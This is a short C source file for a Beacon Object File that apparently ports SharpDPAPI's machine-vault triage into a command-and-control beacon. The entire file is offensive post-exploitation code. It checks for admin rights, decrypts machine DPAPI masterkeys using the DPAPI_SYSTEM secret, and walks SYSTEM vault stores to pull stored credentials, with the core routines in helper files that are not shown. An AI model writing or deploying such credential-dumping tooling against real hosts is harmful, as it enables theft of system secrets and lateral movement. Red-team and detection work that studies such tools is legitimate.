/*
 * machinevaults.c — BOF for SYSTEM vault triage
 *
 * Usage:
 *   machinevaults
 *
 * Decrypts machine DPAPI masterkeys via DPAPI_SYSTEM, then
 * triages vault files from SYSTEM vault stores.
 * Requires high integrity.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    (void)args; (void)args_len;

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n=== SharpDPAPI Machine Vaults (BOF) ===\n");

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Must run from high integrity (admin) context\n");
        return;
    }

    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    /* Step 1: Decrypt machine masterkeys */
    triage_system_masterkeys(&cache);

    if (cache.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] No machine masterkeys decrypted, cannot triage vaults\n");
        mk_cache_free(&cache);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Decrypted %d machine masterkey(s), triaging vaults...\n",
        cache.count);

    /* Step 2: Triage SYSTEM vault files */
    triage_system_vaults(&cache);

    mk_cache_free(&cache);
}
